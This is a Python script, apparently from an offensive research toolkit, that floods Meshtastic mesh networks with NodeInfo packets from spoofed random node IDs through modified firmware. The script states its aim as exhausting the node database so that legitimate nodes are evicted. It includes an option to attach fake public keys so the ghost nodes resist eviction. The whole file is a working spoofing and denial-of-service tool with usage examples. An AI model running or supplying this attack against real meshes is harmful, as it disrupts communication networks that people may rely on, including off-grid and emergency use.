#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
# ]
# ///
"""
nodedb_flood.py — Python-side NodeDB exhaustion attack

Sends EVIL_FLOOD_COUNT NodeInfo packets from random spoofed node IDs via the
evil firmware's EVIL_ALLOW_FROM_OVERRIDE hook. Unlike the firmware-internal
floodNodeInfo(), this script:

  - Gives full control over timing and count from the command line
  - Can be stopped at any time (Ctrl+C)
  - Reports progress and estimated time

Each ghost node gets a random name and optionally a fake 32-byte public key.
Nodes with public keys resist eviction (NodeDB prefers to evict keyless nodes).

Attack class: NodeDB exhaustion (forces eviction of legitimate nodes once the
MAX_NUM_NODES limit is reached — 200 for 8MB ESP32-S3, 250 for 16MB).

Requires: evil firmware with EVIL_ALLOW_FROM_OVERRIDE=1.

Usage:
    python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil

    # Custom count and faster rate
    python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --count 200 --interval 0.3

    # Include fake public keys (resists eviction)
    python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --count 200 --with-key --interval 0.3
"""

import argparse
import os
import random
import signal
import sys
import time

from common import add_connection_args, build_interface, evil_mode, print_banner

# Ghost node name wordlists (mirrors the firmware's ghost_adjectives/ghost_nouns)
ADJECTIVES = [
    "Angry", "Brave", "Calm", "Dark", "Eerie", "Fast", "Grim", "Hasty",
    "Idle", "Jolly", "Keen", "Lazy", "Mean", "Noisy", "Odd", "Pale",
    "Quick", "Rusty", "Shady", "Tiny", "Ugly", "Vile", "Wily", "Xenon",
    "Yucky", "Zany", "Bleak", "Crisp", "Damp", "Dusty",
]
NOUNS = [
    "Node", "Ghost", "Relay", "Packet", "Mesh", "Ninja", "Rogue", "Shade",
    "Wraith", "Phantom", "Specter", "Shadow", "Demon", "Sprite", "Wanderer",
    "Lurker", "Stalker", "Drifter", "Nomad", "Exile",
]


def random_node_id(exclude: set) -> int:
    while True:
        nid = int.from_bytes(os.urandom(4), "little")
        if nid != 0 and nid != 0xFFFFFFFF and nid not in exclude:
            return nid


def ghost_name(node_id: int) -> tuple[str, str]:
    """Return (long_name, short_name) for a ghost node."""
    adj  = ADJECTIVES[node_id % len(ADJECTIVES)]
    noun = NOUNS[(node_id >> 8) % len(NOUNS)]
    long_name  = f"{adj} {noun} {node_id & 0xFFFF:04x}"
    short_name = f"{adj[:2]}{node_id & 0xFF:02x}"
    return long_name, short_name


def send_ghost_nodeinfo(iface, fake_node_id: int, long_name: str, short_name: str,
                        with_key: bool = False, channel: int = 0, hop_limit: int = 3):
    """Send a NodeInfo packet appearing to come from fake_node_id."""
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2
    import meshtastic.protobuf.portnums_pb2 as portnums_pb2

    # Build User protobuf
    user = mesh_pb2.User()
    user.id = f"!{fake_node_id:08x}"
    user.long_name = long_name[:36]
    user.short_name = short_name[:4]
    user.hw_model = 0  # UNSET
    user.is_licensed = False

    if with_key:
        # Fake 32-byte public key — makes the node resist eviction
        user.public_key = bytes([random.randint(0, 255) for _ in range(32)])

    # Build MeshPacket with spoofed from field
    packet = mesh_pb2.MeshPacket()
    setattr(packet, "from", fake_node_id)
    packet.to = 0xFFFFFFFF  # broadcast
    packet.channel = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack = False
    packet.decoded.portnum = portnums_pb2.PortNum.NODEINFO_APP
    packet.decoded.payload = user.SerializeToString()
    packet.decoded.want_response = False

    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)


def main():
    parser = argparse.ArgumentParser(
        description="NodeDB exhaustion: flood the mesh with fake NodeInfo packets",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_connection_args(parser)
    parser.add_argument("--count", type=int, default=200,
                        help="Number of fake nodes to inject (default: 200)")
    parser.add_argument("--interval", type=float, default=0.3,
                        help="Seconds between packets (default: 0.3)")
    parser.add_argument("--with-key", action="store_true",
                        help="Include fake 32-byte public key (resists eviction)")
    parser.add_argument("--channel", type=int, default=0,
                        help="Channel index (default: 0)")
    parser.add_argument("--hop-limit", type=int, default=3, choices=range(0, 8),
                        metavar="{0..7}", help="Hop limit (default: 3)")
    args = parser.parse_args()

    if not evil_mode(args):
        print("[!] ERROR: --evil required. NodeDB flood needs EVIL_ALLOW_FROM_OVERRIDE firmware.")
        sys.exit(1)

    print(f"[*] Connecting to node...")
    iface = build_interface(args)
    time.sleep(2)

    info, node_num = print_banner(iface, args, "nodedb_flood.py — NodeDB exhaustion")
    own_id = node_num
    exclude = {own_id, 0, 0xFFFFFFFF}

    key_str = " with fake public keys" if args.with_key else ""
    eta = args.count * args.interval
    print(f"[*] Injecting {args.count} ghost nodes{key_str}")
    print(f"[*] Interval: {args.interval}s  ETA: {eta:.0f}s (~{eta/60:.1f} min)")
    print(f"[*] NodeDB limit: 200 (8MB ESP32-S3) / 250 (16MB)")
    print(f"[!] Eviction of legitimate nodes begins once the limit is reached")
    print()

    count = 0
    running = True

    def handle_sigint(sig, frame):
        nonlocal running
        print(f"\n[*] Stopped. Injected {count} ghost nodes.")
        running = False

    signal.signal(signal.SIGINT, handle_sigint)

    start = time.time()
    while running and count < args.count:
        fake_id = random_node_id(exclude)
        long_name, short_name = ghost_name(fake_id)

        try:
            send_ghost_nodeinfo(
                iface,
                fake_node_id=fake_id,
                long_name=long_name,
                short_name=short_name,
                with_key=args.with_key,
                channel=args.channel,
                hop_limit=args.hop_limit,
            )
            count += 1
            elapsed = time.time() - start
            rate = count / elapsed if elapsed > 0 else 0
            key_flag = " [key]" if args.with_key else ""
            print(f"  [{count:>4}/{args.count}] !{fake_id:08x}  '{long_name}'{key_flag}  "
                  f"({rate:.2f}/s)", flush=True)
        except Exception as e:
            print(f"  [ERROR] !{fake_id:08x}: {e}")

        if running and count < args.count:
            time.sleep(args.interval)

    print(f"\n[*] Done. Injected {count} ghost nodes in {time.time()-start:.1f}s")
    iface.close()


if __name__ == "__main__":
    main()
